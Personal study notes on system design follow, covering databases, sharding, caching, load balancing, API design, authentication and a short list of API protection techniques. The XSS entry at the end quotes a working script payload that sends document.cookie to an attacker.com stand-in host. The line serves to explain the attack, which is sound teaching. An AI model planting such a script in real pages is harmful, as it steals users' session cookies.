

DataBases
========================================
ACID property of SQL DB ?


NoSQL DB
========================
Drops Consistency from ACID - When to use what ?

Document store - mongoDB
Wide-column - cosmosDB
Key-Value based In-Memory - redis, used for caching & session storage
Graph - neo4j
Inverted index search - Elastic Search,Open Search
OLAP - BigQuery(column storage - read only what you need),Click House (row storage - loads entire rows)

Usecase
------------------------------------------
5 Qns to decide architecture pattern ?

1. What is the access pattern ? - system read heavy or write heavy
2. How much consistency do you need ? - payment,live traffic
3. What happens when things fail ? - graceful degradation,total outage
4. What about Operation cost ? - complexity has a cost
5. How it will handle 10x traffic ?


LIKE '%middle_trailing_wilcard%' : B-Tree in RDBMS can't optimize : fallback to full table search -> move to Elastic search
If Elastic search fails -> PG scoped search / Redis trending item
For intent based search --> add vector DB + fallback PG
For relation based search --> add neo4j entity-relation DB
add to cart -> Redis
Buffer cache eviction ---> where shared buffer cache data is replaced due to
some heavy analytics query ran from backend -> rule of thumb : always keep transaction data & OLAP separate
PG bouncer --> applies connection pooling (on app connection 2.5K -> active DB connection 500) while we're scaling our app, these multiplexing saves DB


Types of scaling
-----------------------------
Vertical/scale up - increase the capacity(CPU,RAM,Disk,Network) of one DB server 
Horizontal/scale out - DB sharding (write heavy),Replication (read heavy)

Types of sharding
--------------------------
range-based : based on range of given key
directory-based : lookup service to direct traffic to DB
geography-based : geographic location based

Types of Replication
----------------------------------
Master-Slave : Master(Read/Write) -> Slave1(Read only),Slave2(Read only)
Master-Master : Master(Read/Write) -> Master(Read/Write) 

Database performance
---------------------------------------
Caching - 
Indexing -
Query optimization - 


CAP theorem 
===========================
Consistency
Availability
Partition


Load Balancer Algorithm 
============================
How it works ? When to use ?
What is health check ?

1. Round Robin : 
2. Least connection : 
3. Least Response time : 
4. IP Hash :
5. Weighted algos :
6. Geographical algos : 
7. Consistent hasing : 


Load Balancer - 
software : NGINX,HAproxy
hardware: F5,citrix
cloud based: azure load balancer

Single point of failure for load balancers
1. Redundency
2. Health check & self healing


Single point of failure
======================================

Load Balancer ----> cache --> DB

Cache Invalidation
---------------------------------
Write-through cache : change the value in cache first then in DB
Write-back cache: only change the cache cron job syncs the cache to DB

Client-side caching : stored in client side browser
Server-side caching : Redis,Memcache,NGINX 
DB caching : Redis,Memcache,NGINX or in the DB itself
CDN (Content Delivery Network) : cloudflare,AZ CDN,
    1. Pull-based : 1st time user request goes to origin server, later stored in nearest CDN server
    2. Push-based : upload to origin server,it's then pushed to CDN server



Core API styles
=========================
When to use what ? When to switch ?

Key design principles: 
Consistency - naming, pattern
Security - authentication,authorization,input validation,rate limiting
Performance - caching strategies,pagination,minimize payloads,reduce round trips
Simplicity - focus on core use case,intuitive design

What to consider while designing an API & why ?
-----------------------------------------------------------
Type of API : REST,GraphQL,gRPC
Communication protocol : 
    HTTP -> RESTful APIs,graphQL
    Websocket -> real-time APIs,still HTTP/1.1 or HTTP/2 (via TCP)
    gRPC -> in between microservices
Data transport mechanism :
    1. JSON/XML - Websocket,REST
    2. Protocol buffer - gRPC
Clear input-output validation & API naming convension:
Security: Logging, Secure header,Rate limiting & other security guideline
        1. Auth method :
        2. Autho framework : 
Sorting & Filtering,Pagination :
Performance: 
Error mechanism :



API design approach
==============================
Top-down : start with high level design & workflow
Bottom-up : begin with existing data model & capabilities
Contract-first : define API contract before implementation

Life-cycle : Design -> Development -> Development & monitoring -> Maintenance -> Deprication & Retirement


Application protocols in Network stack (OSI model)
=====================================================
Application Layer (API focus) - When to use what ? How they work ?
    HTTPS :Secure web traffic (HTTP+TLS/SSL encryption),
    Websockts:  Real-time bi-directional communication,
    MQTT : Lightweight IoT messaging,
    AMQP : Enterprise message queuing,
    gRPC : High-performance remote procedure calls
Transport layer - 
    TCP : Reliable, connection-oriented data delivery
    UDP : Fast, connectionless datagram delivery
Network layer - IPv4,IPv6
Data link - Ethernet,Wifi,Bluetooth,MAC address
Physical layer - Cables & Fiber,Radio Waves (RF used by BT/Wifi),Electrical Signals

Status codes
----------------
2xx : success
3xx : redirection
4xx : client error
5xx : server error

Common Header
--------------------------
content-type
authorization
accept
cache-control
user-agent

Choosing right protocol
----------------------------------
Interactive pattern - request-response vs real-time
Performance - speed vs efficiency
Client compatibility - browser,mobile,legacy
Payload size - data volume , encoding
Security need - authentication, encryption
Developer experience - tooling & documentation


RESTful APIs design
=================================
API pattern - 
    products : /api/v1/products/products/4d5b...e4
    orders : /api/v1/orders/orders/4d5b...e4
    reviews:  /api/v1/products/4d5b...e4/reviews

Filtering - GET /products?category=books&inStock=true
Sorting - GET /products?sort=price_asc
Pagination - GET /products/page=2&limit=3 (sometime used cursor=hash_of_the_page,sometime it's named as offset instead of page)

Error Status codes
----------------
2xx : success
    200 : OK
    201 : Created
    204 : No content
3xx : redirection
4xx : client error
    400: Bad Request
    401: Unauthorized
    404: Not found
5xx : server error
    500: Internal server error


GraphQL APIs design
=====================================
```bash

type User{
    id: ID!
    name: String!
    posts: [Post!]!
}

type Query{
    user(id:ID!):User
}

type Mutation{
    createUser(name:String!):User
}


# query 

query{
    user(id:"123"){
        name
        posts{
            title
        }
    }
}

# creation

mutation{
    createPost(
        title: "New Post",
        body: "Hello"
    ){
        id
        title
    }
}

# Errors

{
    "data" : {"user":null},
    "errors": [
        {
            "statusCode":404,
            "message":"user not found",
            "path":["user"]
        }
    ]
}

```

What are the best practices for GraphQL ?

Authentication & Authorization
=======================================
Authentication - Verify that the user trying to access our system is who
    they claim to be

Authorization - What they're allowed to access once they're authenticated

These are commonly misunderstood concepts
---------------------------------------------------------
- Authentication method != Authorization framework
- Treat JWT as authentication type : it's just a token format
- Confuse Bearer authentication & JWT
- Call OAuth2 an authentication method : it's an authorization framework
- Mix up SSO in with authentication method : it's user experience pattern 

Types of Authentication method & Authorization framework
==================================================================
Basic Auth methos
------------------------------
Basic Auth with base64 encoding - not secure, only used for internal communications
Digest - used MD5 hashing on password + raw response
API Keys - client specific header which is stored in key-hash in server
        Authorization: ApiKey abc123xy.. 
        or
        X-API-Key: abc123xy..
Session - Mostly Redis is used for session storage, difficult to scale for 
distributed system/API based system
NTLM 

Token-based Auth methods
-------------------------------------
Bearer & JWT tokens : JWT is stateless no DB lookup,everything o client
    Authorization: Bearer abc123xy.. 
Access & Refresh tokens

Author framework & Auth method
--------------------------------------
OAuth2 - Authorization framework, sign-in via google account
OpenID connect -  Authentication on top of OAuth2

SSO & Identity protocols
--------------------------
SSO (SAML,OIDC,OAuth2) - it's an user experience not any auth method

Vendor specific implementation
-----------------------------------
Hawk authentication
AWS Signature
Akami EdgeGrid
ASAP (Atlassian)


Authorization frameworks - how applications manage permission
===================================================================
How OAuth2 & JWT help enforce following rules ?

RBAC (Role-Based) - assign role like admin(create,read,update,delete,manage users),editor(create,read,update content),viewer(read content only) - GitHub
ABAC (Attribute-Based) - based on user/resource attribute
    user attr - department,age,clearance level
    resource attr - confidentiality,owner,classification
    env attr - time of day,location,device type

only allow access if : user.department=="HR" && time<6PM && resource.confidentiality=="internal"

ACL (Access Control List) - each resource has it's permission list (google docs sharing)
        doc_123.json  --> [Alice: Read,Bob:Read/Write,Carol:No access]

How they are used
--------------------------------------------------------------
OAuth2 (Delegate authorization) - One service access another on behalf of user
    User --(request access)--> 3rd part app --(get token)--> GitHub API 

JWT,Bearer tokens & permission logics
    User --(request)--> JWT Bearer token --(author model make decision)--> Server Backend
                       {
                        userID:user_123,
                        roles:admin,editor,
                        scopes:read:posts,write:posts,
                        expires:12h,
                        issuer:auth.example.com
                       }

7 Techniques to protect APIs
================================================
1. Rate limiting - per endpoint,per user/ip,overall to mitigate DDoS
2. CORS (Cross-Origin resource sharing) - which domain can call API endpoint
3. SQL & noSQL injection - always use ORM safeguard or parameterised query
4. Firewalls - block suspecious keyword,strange HTTP methods
5. VPNs - private IPs accessable by particular group in same network 
6. CSRF (Cross-Site Request Forgery) - session cookie + CSRF token both checked
7. XSS (Cross-Site Scripting) - in a message if an attacker inject scrip in DB
next time any user fetch message from DB this code will execute in their browser & attacker will steal their session cookies
<script>fetch('https://attacker.com/steal?c='+document.cookie);</script>